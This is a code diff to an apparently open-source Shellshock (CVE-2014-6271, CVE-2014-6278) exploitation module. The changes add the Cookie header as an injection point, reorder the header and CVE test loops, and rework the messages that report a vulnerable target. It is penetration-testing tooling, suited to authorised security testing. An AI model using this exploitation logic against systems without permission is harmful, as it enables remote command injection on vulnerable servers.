@@ -22,6 +22,10 @@ from src.core.requests import headers as log_http_headers
 from src.core.injections.controller import checks
 
 default_user_agent = menu.options.agent
+if menu.options.cookie:
+  if settings.INJECT_TAG in menu.options.cookie:
+    menu.options.cookie = menu.options.cookie.replace(settings.INJECT_TAG ,"")
+  default_cookie = menu.options.cookie
 
 """
 This module exploits the vulnerabilities CVE-2014-6271 [1], CVE-2014-6278 [2] in Apache CGI.
@@ -30,18 +34,18 @@ This module exploits the vulnerabilities CVE-2014-6271 [1], CVE-2014-6278 [2] in
 """
 
 if settings.MULTI_TARGETS or not settings.IS_TTY:
-  if settings.COOKIE_INJECTION == True:
-    settings.COOKIE_INJECTION = None
-  if settings.USER_AGENT_INJECTION == True:
+  if settings.USER_AGENT_INJECTION:
     settings.USER_AGENT_INJECTION = None
-  if settings.REFERER_INJECTION == True:
+  if settings.REFERER_INJECTION:
     settings.REFERER_INJECTION = None
+  if settings.COOKIE_INJECTION:
+    settings.COOKIE_INJECTION = None
 
 # Available HTTP headers
 headers = [
 "User-Agent",
 "Referer",
-"Cookie"
+"Cookie",
 ]
 
 # Available Shellshock CVEs
@@ -603,8 +607,8 @@ def shellshock_handler(url, http_request_method, filename):
   try: 
     i = 0
     total = len(shellshock_cves) * len(headers)
-    for cve in shellshock_cves:
-      for check_header in headers:
+    for check_header in headers:
+      for cve in shellshock_cves:
         # Check injection state
         settings.DETECTION_PHASE = True
         settings.EXPLOITATION_PHASE = False
@@ -619,9 +623,10 @@ def shellshock_handler(url, http_request_method, filename):
           debug_msg = "Generating payload for the injection."
           print(settings.print_debug_msg(debug_msg))
           print(settings.print_payload(payload))
-
         header = {check_header : payload}
         request = _urllib.request.Request(url, None, header)
+        if check_header == "Cookie":
+          menu.options.cookie = payload 
         if check_header == "User-Agent":
           menu.options.agent = payload
         log_http_headers.do_check(request)
@@ -634,6 +639,8 @@ def shellshock_handler(url, http_request_method, filename):
           response = tor.use_tor(request)
         else:
           response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
+        if check_header == "Cookie":
+          menu.options.cookie = default_cookie
         if check_header == "User-Agent":
           menu.options.agent = default_user_agent  
         percent = ((i*100)/total)
@@ -676,14 +683,12 @@ def shellshock_handler(url, http_request_method, filename):
           if settings.VERBOSITY_LEVEL != 0:
             checks.total_of_requests()
 
-          info_msg = "The (" + check_header + ") '"
-          info_msg += url + Style.RESET_ALL + Style.BRIGHT 
-          info_msg += "' seems vulnerable via " + technique + "."
+          info_msg = "The " + check_header + " " + vuln_parameter
+          info_msg += " seems injectable via " + technique + "."
           if settings.VERBOSITY_LEVEL == 0:
             print(settings.SINGLE_WHITESPACE)
           print(settings.print_bold_info_msg(info_msg))
-          sub_content = "\"" + payload + "\""
-          print(settings.print_sub_content(sub_content))
+          print(settings.print_sub_content(payload))
 
           # Enumeration options.
           if settings.ENUMERATION_DONE == True:
